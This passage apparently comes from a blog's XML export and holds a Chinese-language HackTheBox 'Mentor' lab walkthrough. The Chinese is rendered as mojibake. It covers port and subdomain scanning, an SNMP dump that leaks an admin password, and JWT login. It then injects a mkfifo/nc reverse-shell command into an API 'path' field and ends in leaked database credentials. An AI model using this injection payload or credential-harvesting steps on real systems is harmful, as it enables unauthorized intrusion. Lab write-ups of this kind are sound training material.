        <tag>pythonä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Mentor</title>
    <url>/posts/b2f064df.html</url>
    <content><![CDATA[<h1 id="HTB-Mentor"><a href="#HTB-Mentor" class="headerlink" title="HTB-Mentor"></a>HTB-Mentor</h1><h2 id="ä¸€ã€æ€è·¯æ¦‚è¦"><a href="#ä¸€ã€æ€è·¯æ¦‚è¦" class="headerlink" title="ä¸€ã€æ€è·¯æ¦‚è¦"></a>ä¸€ã€æ€è·¯æ¦‚è¦</h2><ol>
<li><p>ä¿¡æ¯æ”¶é›†å¾—åˆ°<code>Swagger UI</code>é¡µé¢ã€SNMPæœåŠ¡ã€è¯¸å¤šæœ‰æ•ˆç›®å½•ï¼›</p>
</li>
<li><p>SNMPé…ç½®ä¿¡æ¯æ³„éœ²ç®¡ç†å‘˜jameså¯†ç ï¼›</p>
</li>
<li><p>ç™»å½•jamesç”¨æˆ·è·å–ç®¡ç†å‘˜JWTï¼›</p>
</li>
<li><p>åˆ©ç”¨ç®¡ç†å‘˜JWTå‘½ä»¤æ‰§è¡Œè·å–è™šæ‹Ÿrootæƒé™ï¼›</p>
</li>
<li><p>å‘ç°PostgreSQLæ•°æ®åº“ï¼Œä¸ä¹‹äº¤äº’è·å–sshè´¦æˆ·ï¼›</p>
</li>
<li><p>ç™»å½•sshè´¦æˆ·è¿è¡Œlinpeasï¼Œä»SNMPé…ç½®æ–‡ä»¶æ‹¿åˆ°jamesç»ˆç«¯å¯†ç ï¼›</p>
</li>
<li><p>åˆ‡æ¢jamesç»ˆç«¯ç”¨æˆ·ï¼Œææƒè·å–rootæƒé™ã€‚</p>
</li>
</ol>
<h2 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h2><p>nmap</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# nmap -sC -sV -oA nmap/result 10.10.11.193
Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-05 19:47 EST
Nmap scan report for 10.10.11.193
Host is up (0.38s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)
|_  256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://mentorquotes.htb/
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.40 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¼€æ”¾ç«¯å£ï¼š22ï¼ˆSSHï¼‰ã€80ï¼ˆHTTPï¼‰ï¼ŒåŸŸå<code>http://mentorquotes.htb/</code></p>
<p>æ·»åŠ åŸŸååˆ°æœ¬åœ°hostsæ–‡ä»¶</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">echo "10.10.11.193  mentorquotes.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>URLè®¿é—®<code>http://mentorquotes.htb/</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306093239887.png"></p>
<p>wfuzzä¸€ä¸‹å­åŸŸ</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# wfuzz -H "Host: FUZZ.mentorquotes.htb" --hc 302,400 -t 50 -H "User-Agent: wa0er" -c -z file,"/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt" http://mentorquotes.htb/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://mentorquotes.htb/
Total requests: 38267

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                              
=====================================================================

000000142:   404        0 L      2 W        22 Ch       "api"                                                

Total time: 0
Processed Requests: 38267
Filtered Requests: 38266
Requests/sec.: 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¾—apiå­åŸŸï¼Œå°†apiå­åŸŸæ·»åŠ è¿›æœ¬åœ°hostsæ–‡ä»¶</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">echo "10.10.11.193  api.mentorquotes.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>è®¿é—®<code>api.mentorquotes.htb</code>ï¼Œæ˜¯404</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306101405953.png"></p>
<p>ffufçˆ†ç ´ä¸€ä¸‹<code>api.mentorquotes.htb</code>çš„ç›®å½•</p>
<pre class="line-numbers language-none"><code class="language-none">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -u http://api.mentorquotes.htb/FUZZ -t 50

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://api.mentorquotes.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 292ms]
    * FUZZ: admin

[Status: 200, Size: 969, Words: 194, Lines: 31, Duration: 533ms]
    * FUZZ: docs

[Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 362ms]
    * FUZZ: users

[Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 1082ms]
    * FUZZ: quotes

[Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 863ms]
    * FUZZ: server-status

:: Progress: [38267/38267] :: Job [1/1] :: 125 req/sec :: Duration: [0:04:47] :: Errors: 0 ::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¾—åˆ°<code>api.mentorquotes.htb</code>å››ä¸ªç›®å½•ï¼š<code>/admin</code>ã€<code>/docs</code>ã€<code>/users</code>ã€<code>/quotes</code>ã€<code>/server-status</code></p>
<p><code>api.mentorquotes.htb/admin</code>å¦‚ä¸‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306103252841.png"></p>
<p><code>api.mentorquotes.htb/docs</code>å¦‚ä¸‹ï¼Œç”¨çš„Swagger UIï¼Œé¡µé¢èƒ½çœ‹åˆ°å¾ˆå¤šAPI</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306110133574.png"></p>
<p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªç«™ç‚¹çš„ç«™ä¸»æ˜¯jamesï¼Œå¹¶ä¸”ä»–çš„é‚®ç®±æ˜¯<code>james@mentorquotes.htb</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306115013576.png"></p>
<p>åœ¨<code>/auth/signup</code>å°è¯•æ³¨å†Œè´¦æˆ·ï¼Œå¦‚ä¸‹ç•Œé¢ï¼Œå¡«å†™emailã€usernameã€passwordï¼Œç‚¹å‡»Executeï¼ŒåŒæ—¶BurpæŠ“åŒ…</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309095353490.png" style="zoom: 80%;">

<p>BurpæŠ“åŒ…é‡æ”¾ï¼Œå¦‚ä¸‹ï¼Œå¯çœ‹åˆ°è´¦æˆ·å·²è¢«åˆ›å»º</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309095634694.png"></p>
<p>å°è¯•ç”¨åˆšåˆ›å»ºçš„è´¦æˆ·åœ¨<code>/auth/login</code>ç™»å½•ï¼Œå¡«å†™emailã€usernameã€passwordï¼Œç‚¹å‡»Executeï¼Œä¾ç„¶BurpæŠ“åŒ…</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309095912378.png" style="zoom:80%;">

<p>Burpé‡æ”¾ï¼Œå‘ç°è¿”å›äº†ä¸€ä¸²JWTï¼ˆJsonWebTokenï¼Œä¸‹ç®€ç§°JWTï¼ŒJWTå…¸å‹çš„ä¸‰æ®µç»“æ„ï¼šxxx.xxx.xxxï¼‰</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309100356141.png"></p>
<pre class="line-numbers language-none"><code class="language-none">"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InN0cmluZyIsImVtYWlsIjoid2EwZXJAZXhhbXBsZS5jb20ifQ.HfrTNgZInwCjDjfhO447ojuw5lEZWi03NmrENknZJZ8"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>/users</code>ç›®å½•åº”è¯¥æ˜¯æ‰€æœ‰ç”¨æˆ·çš„ä¿¡æ¯ï¼Œäºæ˜¯åœ¨<code>/users</code>ç›®å½•å°è¯•ç™»å½•ï¼Œå¦‚æœç›´æ¥ç™»å½•ï¼Œä¼šå‘ç°æç¤ºéœ€è¦Authorizationå­—æ®µï¼Œé‚£æˆ‘ä»¬å°±æŠ“åŒ…åœ¨è¯·æ±‚å¤´æ·»åŠ å¦‚ä¸‹Authorizationé”®å€¼å¯¹ï¼Œé‡æ”¾HTTPè¯·æ±‚ï¼Œå‘ç°æç¤ºåªå…è®¸adminç”¨æˆ·è®¿é—®</p>
<pre class="line-numbers language-none"><code class="language-none">Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InN0cmluZyIsImVtYWlsIjoid2EwZXJAZXhhbXBsZS5jb20ifQ.HfrTNgZInwCjDjfhO447ojuw5lEZWi03NmrENknZJZ8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309104511936.png"></p>
<p>ç„¶åå°è¯•ç”¨jamesç”¨æˆ·çš„é‚®ç®±ç”¨æˆ·åå»æ³¨å†Œï¼Œå‘ç°ä¼šæç¤ºç”¨æˆ·å·²å­˜åœ¨</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309105121413.png"></p>
<p>éšåè¿›è¡Œç™¾èˆ¬å°è¯•ï¼Œå‘ç°å®ƒéªŒè¯ç”¨æˆ·æ˜¯å¦å·²å­˜åœ¨çš„é€»è¾‘æ˜¯ï¼šå½“emailå’ŒusernameåŒæ—¶åŒ¹é…åˆ°ç›¸åŒçš„å€¼æ—¶ï¼Œæ‰ä¼šè®¤å®šæ­¤ç”¨æˆ·å·²å­˜åœ¨ã€‚äºæ˜¯å°è¯•ä¼ªé€ ç®¡ç†å‘˜ç”¨æˆ·è·å–ç®¡ç†å‘˜JWTï¼ˆè¿™é‡Œçš„ç®¡ç†å‘˜ç”¨æˆ·æ¨æµ‹åº”è¯¥æ˜¯ç«™ä¸»jamesæˆ–è€…adminï¼‰ã€‚</p>
<p>ä½†éšåç”¨<code>æ³¨å†Œâ†’ç™»å½•ï¼ˆè·å–JWTï¼‰â†’/usersç›®å½•</code>å°è¯•äº†ä»¥ä¸‹5ç§ç»„åˆï¼Œå‡æç¤ºåªæœ‰adminç”¨æˆ·èƒ½è®¿é—®è¯¥èµ„æº</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
	<span class="token property">"email"</span><span class="token operator">:</span><span class="token string">"james@mentorquotes.htb"</span><span class="token punctuation">,</span>
	<span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"wa0er"</span><span class="token punctuation">,</span>
	<span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"wa0erwa0er"</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
	<span class="token property">"email"</span><span class="token operator">:</span><span class="token string">"wa0er@mentorquotes.htb"</span><span class="token punctuation">,</span>
	<span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"james"</span><span class="token punctuation">,</span>
	<span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"wa0erwa0er"</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
	<span class="token property">"email"</span><span class="token operator">:</span><span class="token string">"admin@mentorquotes.htb"</span><span class="token punctuation">,</span>
	<span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span>
	<span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"wa0erwa0er"</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
	<span class="token property">"email"</span><span class="token operator">:</span><span class="token string">"admin@mentorquotes.htb"</span><span class="token punctuation">,</span>
	<span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"wa0er"</span><span class="token punctuation">,</span>
	<span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"wa0erwa0er"</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
	<span class="token property">"email"</span><span class="token operator">:</span><span class="token string">"wa0er@mentorquotes.htb"</span><span class="token punctuation">,</span>
	<span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span>
	<span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"wa0erwa0er"</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>éšåæ•´ç†æ€è·¯ï¼Œåœ¨ä¸€æ¬¡nmapæ‰«æä¸­ï¼Œçœ‹åˆ°å¦‚ä¸‹ä¿¡æ¯</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# nmap -sU 10.10.11.193
Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-11 21:40 EST
Nmap scan report for mentorquotes.htb (10.10.11.193)
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
161/udp open|filtered snmp

Nmap done: 1 IP address (1 host up) scanned in 1031.83 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>68ç«¯å£ï¼ˆDHCPCï¼‰å’Œ161ç«¯å£ï¼ˆSNMPï¼‰å¼€æ”¾ï¼ŒDHCPå¯èƒ½çš„æ”»å‡»ä¸»è¦å°±æ˜¯æ‹’ç»æœåŠ¡å’Œä¸­é—´äººæ”»å‡»ï¼Œç”¨ä¸ä¸Šï¼Œé‚£å°±ä»SNMPä¸‹æ‰‹ã€‚</p>
<p>SNMPå…¨ç§°ç®€å•ç½‘ç»œç®¡ç†åè®®ï¼Œæ˜¯ä¸“é—¨è®¾è®¡ç”¨äºåœ¨IPç½‘ç»œç®¡ç†ç½‘ç»œèŠ‚ç‚¹ï¼ˆæœåŠ¡å™¨ã€å·¥ä½œç«™ã€è·¯ç”±å™¨ã€äº¤æ¢æœºåŠHUBSç­‰ï¼‰çš„ä¸€ç§æ ‡å‡†åè®®ï¼Œæ˜¯ä¸€ç§åº”ç”¨å±‚åè®®ã€‚é€šè¿‡SNMPå¯ä»¥è®¿é—®è®¾å¤‡ä¿¡æ¯ã€æ”¹å†™å’Œé…ç½®è®¾å¤‡å‚æ•°ç­‰ï¼ŒSNMPè¿è¡Œåœ¨UDP161ç«¯å£ä¸Šï¼Œé‡‡ç”¨UDPåè®®åœ¨ç®¡ç†ç«¯å’Œagentä¹‹é—´ä¼ è¾“ä¿¡æ¯ã€‚</p>
<p>è¯•è¯•ç”¨<code>snmpbulkwalk</code>è¯»å–ç›¸å…³é…ç½®ä¿¡æ¯</p>
<p><a href="https://linux.die.net/man/1/snmpbulkwalk">https://linux.die.net/man/1/snmpbulkwalk</a></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">snmpbulkwalk -c internal -v2c 10.10.11.193 &gt; snmpbulk_mentor
æ³¨ï¼š
-v 1|2c|3  æŒ‡å®šSNMPç‰ˆæœ¬
-c COMMUNITY  æŒ‡å®šcommunity string
-m MIB[:...]  æŒ‡å®šMIBæ–‡ä»¶ï¼ˆæ­¤å¤„æ²¡ç”¨åˆ°ï¼‰<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æŸ¥çœ‹åˆšè¯»å–çš„é…ç½®ä¿¡æ¯ï¼Œæœç´¢å¸¦æœ‰loginå­—ç¬¦ä¸²çš„æ¡ç›®ï¼Œå‘ç°<code>/usr/local/bin/login.py</code>æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²<code>kj23sadkj123as0-d213</code>ï¼Œå¯èƒ½æ˜¯ç®¡ç†å‘˜çš„ç™»å½•å¯†ç </p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cat snmpbulk mentor | grep login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309150130498.png"></p>
<p>æˆ‘ä»¬åˆ°<code>/auth/login</code>ç›®å½•ï¼Œç”¨jamesçš„é‚®ç®±å’Œç”¨æˆ·åï¼Œå¯†ç å¡«å†™åˆšè·å¾—çš„å¯†ç ï¼ŒæˆåŠŸç™»å½•ï¼Œè·å–åˆ°jamesè´¦æˆ·JWT</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309145949205.png"></p>
<pre class="line-numbers language-none"><code class="language-none">"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0"

Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h2 id="ä¸‰ã€å‘½ä»¤æ‰§è¡Œ"><a href="#ä¸‰ã€å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="ä¸‰ã€å‘½ä»¤æ‰§è¡Œ"></a>ä¸‰ã€å‘½ä»¤æ‰§è¡Œ</h2><p>è®¿é—®<code>/users/</code>ç›®å½•ï¼ŒæˆåŠŸæ‹¿åˆ°ç”¨æˆ·åˆ—è¡¨ï¼Œä¸»è¦æ˜¯ä¸¤ä¸ªç”¨æˆ·ï¼šjameså’Œservice_acc</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309145453473.png"></p>
<p>åˆšæ‰æˆ‘ä»¬çˆ†ç ´å‡ºäº†<code>/admin</code>ç›®å½•ï¼Œæˆ‘ä»¬é‡æ–°ç”¨è¿™ä¸ªJWTè®¿é—®æ­¤ç›®å½•ï¼Œå‘ç°æœ‰ä¸¤ä¸ªåŠŸèƒ½ç›®å½•</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"admin_funcs"</span><span class="token operator">:</span><span class="token punctuation">{</span>
	<span class="token property">"check db connection"</span><span class="token operator">:</span><span class="token string">"/check"</span><span class="token punctuation">,</span>
	<span class="token property">"backup the application"</span><span class="token operator">:</span><span class="token string">"/backup"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309152115896.png"></p>
<p>è®¿é—®<code>/admin/check</code>ï¼Œè¿”å›<code>Not implemented yet!</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309152224945.png"></p>
<p>è®¿é—®<code>/admin/backup</code>ï¼Œè¿”å›<code>Method Not Allowed</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309152312484.png"></p>
<p>åœ¨è¯·æ±‚å¤´åŒºåŸŸå•å‡»é¼ æ ‡å³é”®ï¼Œé€‰æ‹©<code>Change request method</code>ï¼Œè‡ªåŠ¨åˆ‡æ¢æˆPOSTæ–¹æ³•ï¼Œç‚¹å‡»<code>send</code>å‘é€æ•°æ®åŒ…åï¼Œ</p>
<p>å¯çœ‹åˆ°å“åº”åŒ…<code>content-type</code>å€¼ä¸º<code>application/json</code>ï¼Œå†åŠ ä¸Šæ•°æ®éƒ¨åˆ†çš„æŠ¥é”™ï¼Œæ„æ€å°±æ˜¯è¯·æ±‚åŒ…éœ€è¦æœ‰å¸¦bodyå±æ€§çš„jsonå¯¹è±¡</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309152517993.png"></p>
<p>ä¿®æ”¹<code>content-type</code>å€¼ä¸º<code>application/json</code>ï¼Œè¯·æ±‚å¤´å†…å®¹æ·»åŠ jsonå¯¹è±¡ï¼Œbodyä¸ºç©ºå°±è¡Œï¼Œåˆæç¤ºéœ€è¦pathå±æ€§</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309153313297.png"></p>
<p>äºæ˜¯åœ¨è¯·æ±‚å¤´å†…å®¹æ·»åŠ bodyå±æ€§å’Œpathå±æ€§ï¼Œè¿”å›<code>Done!</code>ï¼Œå—¯ï¼Ÿï¼Ÿï¼Ÿï¼ŒDoneäº†ä¸ªå¯‚å¯ï¼Œåº”è¯¥æ˜¯ä»£å…¥æ‰§è¡Œäº†</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309153439313.png"></p>
<p>é‚£æˆ‘ä»¬å°±å°è¯•æ‰§è¡Œå‘½ä»¤ï¼Œä¿®æ”¹bodyå¦‚ä¸‹ï¼Œä¹Ÿå°±æ˜¯pingæœ¬åœ°ä¸»æœºï¼ˆåŠ¡å¿…è®°å¾—æœ«å°¾åŠ åˆ†å·ï¼ï¼‰</p>
<p>åœ¨å‘é€è¯·æ±‚åŒ…å‰åœ¨æœ¬åœ°å¼€å¯tcpdumpæ•è·æ•°æ®åŒ…</p>
<pre class="line-numbers language-none"><code class="language-none">tcpdump -i tun0 icmp   #åªæ•è·tun0ç½‘å¡çš„icmpåè®®æ•°æ®åŒ…<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230312123956105.png"></p>
<p>å‘é€è¯·æ±‚åŒ…åï¼Œå¯åœ¨æœ¬åœ°çœ‹åˆ°æœ‰æ•°æ®åŒ…è¢«æ•è·ï¼Œè¯´æ˜å‘½ä»¤è¢«æˆåŠŸæ‰§è¡Œ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309153957568.png"></p>
<p>é‚£å°±æ„é€ å¦‚ä¸‹è¯·æ±‚åŒ…ï¼Œæœ¬åœ°å¼€å¯ncç›‘å¬</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nc -nvlp 9898<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/admin/backup</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">api.mentorquotes.htb</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span></span>
<span class="token header"><span class="token header-name keyword">Authorization</span><span class="token punctuation">:</span><span class="token header-value">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.5</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://api.mentorquotes.htb/docs</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">108</span></span>
<span class="token application-json">
<span class="token punctuation">{</span>
	<span class="token property">"body"</span><span class="token operator">:</span> <span class="token string">"wa0er"</span><span class="token punctuation">,</span>
	<span class="token property">"path"</span><span class="token operator">:</span><span class="token string">"/;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.X.X 9898 &gt;/tmp/f;"</span>
<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æˆåŠŸåå¼¹shellï¼Œè·å–åˆ°rootæƒé™ï¼Œä½†çœ‹åˆ°ncæç¤º<code>sh: can't access tty; job control turned off</code>ï¼Œè¿™è¯´æ˜æ ¹æœ¬å°±æ²¡æœ‰è¿›åˆ°æ§åˆ¶ç»ˆç«¯ï¼Œå¯èƒ½æ˜¯ä¸ªè™šæ‹Ÿç¯å¢ƒä¹‹ç±»çš„ï¼Œå°è¯•è¯»å–<code>/root/root.txt</code>æ–‡ä»¶å‘ç°ç¡®å®æ²¡æœ‰ï¼Œæ‰€ä»¥è¿˜è¦è¿›ä¸€æ­¥getshell</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230312130834345.png"></p>
<p><code>/app/app</code>ç›®å½•ä¸‹æœ‰<code>db.py</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309160934921.png"></p>
<p><code>db.py</code>å†…å®¹å¦‚ä¸‹</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os

<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> <span class="token punctuation">(</span>Column<span class="token punctuation">,</span> DateTime<span class="token punctuation">,</span> Integer<span class="token punctuation">,</span> String<span class="token punctuation">,</span> Table<span class="token punctuation">,</span> create_engine<span class="token punctuation">,</span> MetaData<span class="token punctuation">)</span>
<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>sql <span class="token keyword">import</span> func
<span class="token keyword">from</span> databases <span class="token keyword">import</span> Database

<span class="token comment"># Database url if none is passed the default one is used</span>
DATABASE_URL <span class="token operator">=</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"DATABASE_URL"</span><span class="token punctuation">,</span> <span class="token string">"postgresql://postgres:postgres@172.22.0.1/mentorquotes_db"</span><span class="token punctuation">)</span>

<span class="token comment"># SQLAlchemy for quotes</span>
